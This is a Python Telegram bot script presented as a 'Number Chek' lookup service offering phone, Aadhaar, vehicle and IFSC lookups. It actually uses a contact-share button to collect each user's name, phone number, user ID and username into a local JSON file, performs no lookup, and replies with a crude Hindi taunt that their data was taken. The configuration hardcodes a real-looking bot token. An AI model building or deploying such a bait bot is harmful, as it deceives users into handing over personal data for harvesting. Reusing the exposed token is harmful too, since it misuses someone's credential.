import telebot
from datetime import datetime, timedelta
import logging
import os
import json
import platform
import subprocess
import sys
import re
from uuid import getnode as get_mac
import socket
import requests
import time
import shutil
import hashlib
from functools import wraps
import threading

# Try to import psutil with proper error handling
PSUTIL_AVAILABLE = False
try:
    import psutil
    PSUTIL_AVAILABLE = True
    print("✓ psutil loaded successfully")
except ImportError:
    print("⚠️ psutil not available - some features will be limited")
    # Don't try to install automatically to avoid errors
    pass

# ANSI color codes
C = "\033[96m"
G = "\033[92m"
B = "\033[94m"
Y = "\033[93m"
R = "\033[91m"
W = "\033[97m"
M = "\033[95m"
RS = "\033[0m"

# Print banner at startup
print(f"\n{C}============================================================{RS}\n")

print(f"{G}  ██████╗   ██████╗ ████████╗██╗         ██████╗  ██████╗ ████████╗███╗   ██╗ {RS}")
print(f"{B}  ██╔══██╗ ██╔════╝ ╚══██╔══╝██║         ██╔══██╗██╔═══██╗╚══██╔══╝████╗  ██║ {RS}")
print(f"{C}  ██║  ██║ ██║  ███╗   ██║   ██║         ██████╔╝██║   ██║   ██║   ██╔██╗ ██║ {RS}")
print(f"{Y}  ██║  ██║ ██║   ██║   ██║   ██║         ██╔══██╗██║   ██║   ██║   ██║╚██╗██║ {RS}")
print(f"{R}  ██████╔╝ ╚██████╔╝   ██║   ███████╗    ██████╔╝╚██████╔╝   ██║   ██║ ╚████║ {RS}")
print(f"{W}  ╚═════╝   ╚═════╝    ╚═╝   ╚══════╝    ╚═════╝  ╚═════╝    ╚═╝   ╚═╝  ╚═══╝ {RS}")

print(f"\n{M}                 >>> Developer By Aryan Afridi<<<{RS}\n")

# === CONFIGURATION ===
class Config:
    BOT_TOKEN = "8364865755:AAGOxttTjrN2pEudtTJPAyrDIHgbA3KdPko"
    CONTACTS_FILE = "contacts_advanced.json"
    LOG_FILE = "bot_logs.txt"
    ADMIN_CHAT_ID = None
    MAX_CONTACTS = 1000
    BACKUP_INTERVAL = 3600
    ENABLE_LOCATION = False  # Changed to False

# === SETUP LOGGING ===
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(Config.LOG_FILE),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Initialize bot
bot = telebot.TeleBot(Config.BOT_TOKEN, threaded=True)

# === DECORATORS ===
def admin_only(func):
    @wraps(func)
    def wrapper(message):
        if Config.ADMIN_CHAT_ID and message.chat.id != Config.ADMIN_CHAT_ID:
            bot.reply_to(message, "⛔ This command is admin only!")
            return
        return func(message)
    return wrapper

def handle_errors(func):
    @wraps(func)
    def wrapper(*args, **kwargs):
        try:
            return func(*args, **kwargs)
        except Exception as e:
            logger.error(f"Error in {func.__name__}: {e}")
            if args and hasattr(args[0], 'chat'):
                bot.send_message(args[0].chat.id, f"❌ Error: {str(e)[:100]}")
            return None
    return wrapper

# === ADVANCED DEVICE INFO COLLECTOR ===
class DeviceInfoCollector:
    """Get complete device information"""
    
    @staticmethod
    def get_phone_details():
        """Get complete phone details using multiple methods"""
        phone_info = {
            'device_model': 'Unknown',
            'brand': 'Unknown',
            'manufacturer': 'Unknown',
            'android_version': 'Unknown',
            'sdk_version': 'Unknown',
            'device_name': 'Unknown',
            'hardware': 'Unknown',
            'build_fingerprint': 'Unknown',
            'board': 'Unknown',
            'platform': 'Unknown'
        }
        
        try:
            # METHOD 1: Get from build.prop file (Most reliable for Android)
            build_prop_paths = [
                '/system/build.prop',
                '/vendor/build.prop',
                '/product/build.prop'
            ]
            
            for build_path in build_prop_paths:
                if os.path.exists(build_path):
                    try:
                        with open(build_path, 'r', encoding='utf-8', errors='ignore') as f:
                            build_prop = f.read()
                            
                            # All possible model properties
                            model_props = [
                                'ro.product.model',
                                'ro.product.device',
                                'ro.product.name',
                                'ro.build.product',
                                'ro.product.board',
                                'ro.product.vendor.model'
                            ]
                            
                            for prop in model_props:
                                match = re.search(f'{prop}=(.*)', build_prop, re.MULTILINE)
                                if match and match.group(1).strip() and phone_info['device_model'] == 'Unknown':
                                    phone_info['device_model'] = match.group(1).strip()
                            
                            # Brand properties
                            brand_props = [
                                'ro.product.brand',
                                'ro.product.manufacturer',
                                'ro.product.vendor.brand',
                                'ro.product.vendor.manufacturer'
                            ]
                            
                            for prop in brand_props:
                                match = re.search(f'{prop}=(.*)', build_prop, re.MULTILINE)
                                if match and match.group(1).strip() and phone_info['brand'] == 'Unknown':
                                    phone_info['brand'] = match.group(1).strip()
                                    if phone_info['manufacturer'] == 'Unknown':
                                        phone_info['manufacturer'] = match.group(1).strip()
                            
                            # Android version
                            version_match = re.search(r'ro\.build\.version\.release=(.*)', build_prop, re.MULTILINE)
                            if version_match:
                                phone_info['android_version'] = version_match.group(1).strip()
                            
                            # SDK version
                            sdk_match = re.search(r'ro\.build\.version\.sdk=(.*)', build_prop, re.MULTILINE)
                            if sdk_match:
                                phone_info['sdk_version'] = sdk_match.group(1).strip()
                            
                            # Hardware info
                            hardware_match = re.search(r'ro\.hardware=(.*)', build_prop, re.MULTILINE)
                            if hardware_match:
                                phone_info['hardware'] = hardware_match.group(1).strip()
                            
                            # Build fingerprint
                            fingerprint_match = re.search(r'ro\.build\.fingerprint=(.*)', build_prop, re.MULTILINE)
                            if fingerprint_match:
                                phone_info['build_fingerprint'] = fingerprint_match.group(1).strip()
                            
                            # Device name
                            name_match = re.search(r'ro\.product\.name=(.*)', build_prop, re.MULTILINE)
                            if name_match:
                                phone_info['device_name'] = name_match.group(1).strip()
                            
                            # Board info
                            board_match = re.search(r'ro\.product\.board=(.*)', build_prop, re.MULTILINE)
                            if board_match:
                                phone_info['board'] = board_match.group(1).strip()
                            
                            # Platform
                            platform_match = re.search(r'ro\.board\.platform=(.*)', build_prop, re.MULTILINE)
                            if platform_match:
                                phone_info['platform'] = platform_match.group(1).strip()
                            
                            break  # Found build.prop, exit loop
                    except Exception as e:
                        logger.debug(f"Error reading {build_path}: {e}")
                        continue
            
            # METHOD 2: Get from getprop command (Termux/Android)
            try:
                # Get model
                result = subprocess.run(['getprop', 'ro.product.model'], capture_output=True, text=True, timeout=3)
                if result.returncode == 0 and result.stdout.strip():
                    phone_info['device_model'] = result.stdout.strip()
                
                # Get brand
                result = subprocess.run(['getprop', 'ro.product.brand'], capture_output=True, text=True, timeout=3)
                if result.returncode == 0 and result.stdout.strip():
                    phone_info['brand'] = result.stdout.strip()
                
                # Get manufacturer
                result = subprocess.run(['getprop', 'ro.product.manufacturer'], capture_output=True, text=True, timeout=3)
                if result.returncode == 0 and result.stdout.strip():
                    phone_info['manufacturer'] = result.stdout.strip()
                
                # Get Android version
                result = subprocess.run(['getprop', 'ro.build.version.release'], capture_output=True, text=True, timeout=3)
                if result.returncode == 0 and result.stdout.strip():
                    phone_info['android_version'] = result.stdout.strip()
                
                # Get SDK
                result = subprocess.run(['getprop', 'ro.build.version.sdk'], capture_output=True, text=True, timeout=3)
                if result.returncode == 0 and result.stdout.strip():
                    phone_info['sdk_version'] = result.stdout.strip()
                
                # Get device name
                result = subprocess.run(['getprop', 'ro.product.device'], capture_output=True, text=True, timeout=3)
                if result.returncode == 0 and result.stdout.strip():
                    phone_info['device_name'] = result.stdout.strip()
                
                # Get hardware
                result = subprocess.run(['getprop', 'ro.hardware'], capture_output=True, text=True, timeout=3)
                if result.returncode == 0 and result.stdout.strip():
                    phone_info['hardware'] = result.stdout.strip()
                    
            except Exception as e:
                logger.debug(f"getprop command failed: {e}")
            
            # METHOD 3: Try to get from /proc/version
            if os.path.exists('/proc/version') and phone_info['android_version'] == 'Unknown':
                try:
                    with open('/proc/version', 'r') as f:
                        version_info = f.read()
                        # Look for Android version in kernel info
                        android_match = re.search(r'Android (\d+\.\d+)', version_info)
                        if android_match:
                            phone_info['android_version'] = android_match.group(1)
                except:
                    pass
            
            # METHOD 4: Try platform info for non-Android
            if phone_info['device_model'] == 'Unknown':
                try:
                    phone_info['device_model'] = platform.node() or platform.machine()
                    phone_info['brand'] = platform.system()
                    phone_info['manufacturer'] = platform.system()
                except:
                    pass
            
            # METHOD 5: Try to get from /sys/class/dmi/id/ (for some devices)
            if phone_info['device_model'] == 'Unknown':
                dmi_paths = [
                    '/sys/class/dmi/id/product_name',
                    '/sys/class/dmi/id/product_version'
                ]
                for dmi_path in dmi_paths:
                    if os.path.exists(dmi_path):
                        try:
                            with open(dmi_path, 'r') as f:
                                phone_info['device_model'] = f.read().strip()
                                break
                        except:
                            pass
            
            # Clean up and format model names
            if phone_info['device_model'] != 'Unknown':
                # Remove common prefixes
                model = phone_info['device_model'].strip()
                
                # Format for better readability
                if 'SM-' in model.upper() and phone_info['brand'] != 'Unknown':
                    phone_info['device_model'] = f"{phone_info['brand']} {model.upper()}"
                elif 'M201' in model or 'M210' in model:
                    phone_info['device_model'] = f"Xiaomi {model}"
                
                # Log successful detection
                logger.info(f"Phone detected: {phone_info['brand']} {phone_info['device_model']} (Android {phone_info['android_version']})")
            else:
                logger.warning("Could not detect phone model - trying alternative methods")
                
        except Exception as e:
            logger.error(f"Error getting phone details: {e}")
        
        return phone_info
    
    @staticmethod
    def get_battery_info():
        """Get battery information"""
        info = {}
        try:
            # Try psutil if available
            if PSUTIL_AVAILABLE and hasattr(psutil, 'sensors_battery'):
                try:
                    battery = psutil.sensors_battery()
                    if battery:
                        info['percent'] = f"{battery.percent}%"
                        info['status'] = "Charging" if battery.power_plugged else "Discharging"
                        if battery.secsleft != -1:
                            hours = battery.secsleft // 3600
                            minutes = (battery.secsleft % 3600) // 60
                            info['time_left'] = f"{hours}h {minutes}m"
                except:
                    pass
            
            # Android specific battery info (most reliable)
            battery_paths = [
                '/sys/class/power_supply/battery',
                '/sys/class/power_supply/Battery'
            ]
            
            for base_path in battery_paths:
                if os.path.exists(base_path):
                    battery_files = {
                        'capacity': 'percent',
                        'status': 'status',
                        'technology': 'technology',
                        'temp': 'temperature',
                        'health': 'health',
                        'voltage_now': 'voltage',
                        'current_now': 'current'
                    }
                    
                    for file, key in battery_files.items():
                        path = os.path.join(base_path, file)
                        if os.path.exists(path):
                            try:
                                with open(path, 'r') as f:
                                    value = f.read().strip()
                                    if key == 'temperature' and value.isdigit():
                                        info[key] = f"{int(value) / 10:.1f}°C"
                                    elif key == 'voltage' and value.isdigit():
                                        info[key] = f"{int(value) / 1000000:.2f}V"
                                    elif key == 'current' and value.isdigit():
                                        info[key] = f"{int(value) / 1000:.0f}mA"
                                    elif value:
                                        info[key] = value
                            except:
                                pass
                    
                    # If we found battery info, break
                    if info:
                        break
                                
        except Exception as e:
            logger.error(f"Error getting battery info: {e}")
        return info
    
    @staticmethod
    def get_network_info():
        """Get network information"""
        info = {}
        try:
            # MAC Address
            try:
                mac = get_mac()
                info['mac_address'] = ':'.join(('%012X' % mac)[i:i+2] for i in range(0, 12, 2))
            except:
                info['mac_address'] = "Not Available"
            
            # Hostname
            try:
                info['hostname'] = socket.gethostname()
            except:
                info['hostname'] = "Not Available"
            
            # Local IP
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect(("8.8.8.8", 80))
                info['local_ip'] = s.getsockname()[0]
                s.close()
            except:
                info['local_ip'] = "Not Available"
                
            # Public IP
            try:
                response = requests.get('https://api.ipify.org?format=json', timeout=5)
                if response.status_code == 200:
                    info['public_ip'] = response.json()['ip']
            except:
                info['public_ip'] = "Not Available"
                
            # WiFi info for Android
            try:
                result = subprocess.run(['dumpsys', 'wifi'], capture_output=True, text=True, timeout=5)
                if result.returncode == 0:
                    ssid_match = re.search(r'SSID: "(.*)"', result.stdout)
                    if ssid_match:
                        info['wifi_ssid'] = ssid_match.group(1)
                    
                    bssid_match = re.search(r'BSSID: (.*)', result.stdout)
                    if bssid_match:
                        info['wifi_bssid'] = bssid_match.group(1)
                    
                    # Signal strength
                    rssi_match = re.search(r'RSSI: (.*)', result.stdout)
                    if rssi_match:
                        info['wifi_signal'] = rssi_match.group(1)
            except:
                pass
                
        except Exception as e:
            logger.error(f"Error getting network info: {e}")
        return info
    
    @staticmethod
    def get_location_info(ip=None):
        """Get location information - DISABLED"""
        # Return empty dict - location tracking disabled
        return {}

# === CONTACT MANAGEMENT ===
class ContactManager:
    def __init__(self, filename):
        self.filename = filename
        self.contacts = []
        self.load_contacts()
    
    def load_contacts(self):
        try:
            if os.path.exists(self.filename):
                with open(self.filename, 'r', encoding='utf-8') as f:
                    self.contacts = json.load(f)
                logger.info(f"Loaded {len(self.contacts)} contacts")
        except Exception as e:
            logger.error(f"Error loading contacts: {e}")
            self.contacts = []
    
    def save_contacts(self):
        try:
            if os.path.exists(self.filename):
                backup_file = f"{self.filename}.backup"
                shutil.copy2(self.filename, backup_file)
            
            with open(self.filename, 'w', encoding='utf-8') as f:
                json.dump(self.contacts, f, indent=4, ensure_ascii=False)
            
            if len(self.contacts) > Config.MAX_CONTACTS:
                self.contacts = self.contacts[-Config.MAX_CONTACTS:]
            return True
        except Exception as e:
            logger.error(f"Error saving contacts: {e}")
            return False
    
    def add_contact(self, contact_data):
        try:
            contact_data['id'] = hashlib.md5(
                f"{contact_data['timestamp']}{contact_data['user_id']}".encode()
            ).hexdigest()[:8]
            self.contacts.append(contact_data)
            return self.save_contacts()
        except Exception as e:
            logger.error(f"Error adding contact: {e}")
            return False
    
    def get_contact_stats(self):
        stats = {
            'total': len(self.contacts),
            'today': 0,
            'this_week': 0,
            'this_month': 0,
            'unique_users': len(set(c.get('user_id') for c in self.contacts))
        }
        
        today = datetime.now().date()
        week_start = today - timedelta(days=today.weekday())
        month_start = today.replace(day=1)
        
        for contact in self.contacts:
            try:
                contact_date = datetime.fromisoformat(contact['timestamp']).date()
                if contact_date == today:
                    stats['today'] += 1
                if contact_date >= week_start:
                    stats['this_week'] += 1
                if contact_date >= month_start:
                    stats['this_month'] += 1
            except:
                pass
                
        return stats
    
    def search_contacts(self, query):
        results = []
        query = query.lower()
        for contact in self.contacts:
            if (query in contact.get('full_name', '').lower() or
                query in contact.get('phone_number', '') or
                query in contact.get('username', '').lower()):
                results.append(contact)
        return results

# === DISPLAY FUNCTIONS ===
class DisplayManager:
    @staticmethod
    def display_contact(contact_data, phone_info, battery_info, network_info, location_info):
        """Display all contact details - location removed"""
        print("\n" + "█"*80)
        print("█" + " "*78 + "█")
        print(f"█{'📱 NEW CONTACT RECEIVED!'.center(78)}█")
        print("█" + " "*78 + "█")
        print("█"*80)
        
        # User Information
        print("\n👤 USER INFORMATION")
        print("─"*80)
        print(f"  • Full Name    : {contact_data['full_name']}")
        print(f"  • Phone        : {contact_data['phone_number']}")
        print(f"  • User ID      : {contact_data['user_id']}")
        print(f"  • Username     : @{contact_data['username']}" if contact_data['username'] != "Not Available" else "  • Username     : Not Available")
        print(f"  • Date/Time    : {contact_data['date']} at {contact_data['time']}")
        print(f"  • Day          : {contact_data['weekday']}")
        
        # Phone Model Information
        print("\n📱 PHONE MODEL INFORMATION")
        print("─"*80)
        print(f"  • Device Model : {phone_info.get('device_model', 'N/A')}")
        print(f"  • Brand        : {phone_info.get('brand', 'N/A')}")
        print(f"  • Manufacturer : {phone_info.get('manufacturer', 'N/A')}")
        print(f"  • Android Ver  : {phone_info.get('android_version', 'N/A')}")
        print(f"  • SDK Version  : {phone_info.get('sdk_version', 'N/A')}")
        
        # Additional device info if available
        if phone_info.get('device_name') and phone_info.get('device_name') != 'Unknown':
            print(f"  • Device Name  : {phone_info.get('device_name', 'N/A')}")
        if phone_info.get('hardware') and phone_info.get('hardware') != 'Unknown':
            print(f"  • Hardware     : {phone_info.get('hardware', 'N/A')}")
        if phone_info.get('platform') and phone_info.get('platform') != 'Unknown':
            print(f"  • Platform     : {phone_info.get('platform', 'N/A')}")
        
        # Battery Information
        if battery_info:
            print("\n🔋 BATTERY INFORMATION")
            print("─"*80)
            print(f"  • Level        : {battery_info.get('percent', 'N/A')}")
            print(f"  • Status       : {battery_info.get('status', 'N/A')}")
            if battery_info.get('technology'):
                print(f"  • Technology   : {battery_info.get('technology', 'N/A')}")
            if battery_info.get('temperature'):
                print(f"  • Temperature  : {battery_info.get('temperature', 'N/A')}")
            if battery_info.get('health'):
                print(f"  • Health       : {battery_info.get('health', 'N/A')}")
            if battery_info.get('voltage'):
                print(f"  • Voltage      : {battery_info.get('voltage', 'N/A')}")
        
        # Network Information
        if network_info:
            print("\n🌐 NETWORK INFORMATION")
            print("─"*80)
            print(f"  • MAC Address  : {network_info.get('mac_address', 'N/A')}")
            print(f"  • Local IP     : {network_info.get('local_ip', 'N/A')}")
            print(f"  • Public IP    : {network_info.get('public_ip', 'N/A')}")
            if network_info.get('wifi_ssid'):
                print(f"  • WiFi SSID    : {network_info.get('wifi_ssid', 'N/A')}")
            if network_info.get('wifi_bssid'):
                print(f"  • WiFi BSSID   : {network_info.get('wifi_bssid', 'N/A')}")
            if network_info.get('wifi_signal'):
                print(f"  • Signal       : {network_info.get('wifi_signal', 'N/A')} dBm")
        
        # Location Information - COMPLETELY REMOVED
        
        print("\n" + "█"*80)
        print(f"█{'💾 Saved to: ' + Config.CONTACTS_FILE:<78}█")
        print("█"*80 + "\n")
    
    @staticmethod
    def format_message_for_user():
        return (
            "✅ *Data Chek successfully!*\n\n"
            "📞 *Your information has been securely stored.*\n\n"
            "🌐 *Data Chek:*\n"
            "• Your contact is kept confidential\n"
            "• Device info helps with security\n\n"
            "लौड़े लग गए हैं डेटा! 💥"
        )

# === BOT HANDLERS ===
@bot.message_handler(commands=['start'])
@handle_errors
def welcome(message):
    try:
        markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=False)
        contact_button = telebot.types.KeyboardButton("📱 Number Lookup", request_contact=True)
        markup.add(contact_button)
        
        welcome_text = (
            "🌟 *Welcome to DGTL Ostin Number Chek Bot!*\n\n"
            "I collect detailed information for enhanced security.\n\n"
            "📋 *What I collect:*\n"
            "📞 Number Lookup\n"
            "🪪 Adhar Lookup information\n"
            "🏎 Vehicles Lookup\n"
            "🏛️ IFC Lookup\n\n"
            "🌐 *Your data is stored securely.*\n\n"
            "👇 *Click the button below to Number Check Details.*"
        )
        
        bot.send_message(message.chat.id, welcome_text, parse_mode='Markdown', reply_markup=markup)
        logger.info(f"User {message.from_user.id} started the bot")
        
    except Exception as e:
        logger.error(f"Error in welcome handler: {e}")

@bot.message_handler(content_types=['contact'])
@handle_errors
def handle_contact(message):
    try:
        contact = message.contact
        user = message.from_user
        
        now = datetime.now()
        
        phone_number = contact.phone_number
        first_name = contact.first_name or "Not Provided"
        last_name = contact.last_name or ""
        full_name = f"{first_name} {last_name}".strip()
        
        user_id = user.id
        username = user.username if user.username else "Not Available"
        
        # Collect information
        device_collector = DeviceInfoCollector()
        
        phone_info = device_collector.get_phone_details()
        battery_info = device_collector.get_battery_info()
        network_info = device_collector.get_network_info()
        location_info = device_collector.get_location_info()  # Will return empty dict
        
        # Prepare contact data
        contact_data = {
            "timestamp": now.isoformat(),
            "date": now.strftime("%d/%m/%Y"),
            "time": now.strftime("%I:%M:%S %p"),
            "weekday": now.strftime("%A"),
            "user_id": user_id,
            "username": username,
            "full_name": full_name,
            "first_name": first_name,
            "last_name": last_name,
            "phone_number": phone_number,
            "phone_info": phone_info,
            "battery_info": battery_info,
            "network_info": network_info,
            "location_info": location_info  # Empty dict
        }
        
        # Save contact
        contact_manager = ContactManager(Config.CONTACTS_FILE)
        if contact_manager.add_contact(contact_data):
            DisplayManager.display_contact(contact_data, phone_info, battery_info, network_info, location_info)
            
            bot.send_message(message.chat.id, DisplayManager.format_message_for_user(), parse_mode='Markdown')
            
            if Config.ADMIN_CHAT_ID:
                admin_msg = (
                    f"📱 *New Contact*\n\n"
                    f"👤 *Name:* {full_name}\n"
                    f"📞 *Phone:* {phone_number}\n"
                    f"📱 *Device:* {phone_info.get('device_model', 'Unknown')}\n"
                    f"🏭 *Brand:* {phone_info.get('brand', 'Unknown')}\n"
                    f"🤖 *Android:* {phone_info.get('android_version', 'Unknown')}\n"
                    f"🔋 *Battery:* {battery_info.get('percent', 'Unknown')}"
                )
                bot.send_message(Config.ADMIN_CHAT_ID, admin_msg, parse_mode='Markdown')
            
            logger.info(f"Contact saved: {full_name} - {phone_number}")
        else:
            bot.send_message(message.chat.id, "❌ Failed to save contact.")
            
    except Exception as e:
        logger.error(f"Error in contact handler: {e}")
        bot.send_message(message.chat.id, f"❌ Error: {str(e)[:100]}")

@bot.message_handler(commands=['status'])
@handle_errors
def status_command(message):
    try:
        contact_manager = ContactManager(Config.CONTACTS_FILE)
        stats = contact_manager.get_contact_stats()
        
        status_text = (
            "📊 *Bot Statistics*\n\n"
            f"📱 *Total Contacts:* {stats['total']}\n"
            f"👥 *Unique Users:* {stats['unique_users']}\n\n"
            "📅 *Period Stats:*\n"
            f"  • Today: {stats['today']}\n"
            f"  • This Week: {stats['this_week']}\n"
            f"  • This Month: {stats['this_month']}\n\n"
            f"💾 *Storage:* {Config.CONTACTS_FILE}"
        )
        
        bot.send_message(message.chat.id, status_text, parse_mode='Markdown')
        
    except Exception as e:
        logger.error(f"Error in status command: {e}")

@bot.message_handler(commands=['help'])
@handle_errors
def help_command(message):
    help_text = """
🤖 *Advanced Contact Bot v2.0*

*Commands:*
/start - Start the bot
/help - Show help
/status - Check status

*Features:*
✅ Collect contact details
✅ Phone model detection
✅ Battery information
✅ Network details
✅ Automatic backups

*Privacy:* All data stored locally.
"""
    bot.send_message(message.chat.id, help_text, parse_mode='Markdown')

@bot.message_handler(func=lambda message: True)
@handle_errors
def echo_all(message):
    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=False)
    contact_button = telebot.types.KeyboardButton("📱 Number Lookup", request_contact=True)
    markup.add(contact_button)
    
    bot.send_message(message.chat.id, "📱 Number Checker Lookup", reply_markup=markup)

# === AUTO BACKUP THREAD ===
def auto_backup():
    while True:
        try:
            time.sleep(Config.BACKUP_INTERVAL)
            if os.path.exists(Config.CONTACTS_FILE):
                backup_file = f"{Config.CONTACTS_FILE}.backup_{datetime.now().strftime('%Y%m%d')}"
                shutil.copy2(Config.CONTACTS_FILE, backup_file)
                logger.info(f"Auto backup created: {backup_file}")
        except Exception as e:
            logger.error(f"Auto backup error: {e}")

# === MAIN FUNCTION ===
if __name__ == '__main__':
    print("\n📊 Bot Configuration:")
    print(f"  • Bot Token: {'✓' if Config.BOT_TOKEN else '✗'}")
    print(f"  • Contacts File: {Config.CONTACTS_FILE}")
    print(f"  • Log File: {Config.LOG_FILE}")
    print(f"  • psutil Available: {'✓' if PSUTIL_AVAILABLE else '✗'}")
    print(f"  • Location Tracking: {'✗'}")
    print("\n📱 Features:")
    print("  ✓ Contact Collection")
    print("  ✓ Phone Model Detection")
    print("  ✓ Battery Details")
    print("  ✓ Network Details")
    print("  ✓ Auto Backup")
    print("\n" + "─"*80)
    print("🟢 Bot is starting...")
    print("💾 Press Ctrl+C to stop\n")
    
    # Start auto backup thread
    backup_thread = threading.Thread(target=auto_backup, daemon=True)
    backup_thread.start()
    
    try:
        bot.infinity_polling(timeout=10, long_polling_timeout=5)
        
    except KeyboardInterrupt:
        print("\n🔴 Bot stopped by user")
    except Exception as e:
        logger.error(f"Bot error: {e}")
        print(f"\n❌ Bot error: {e}")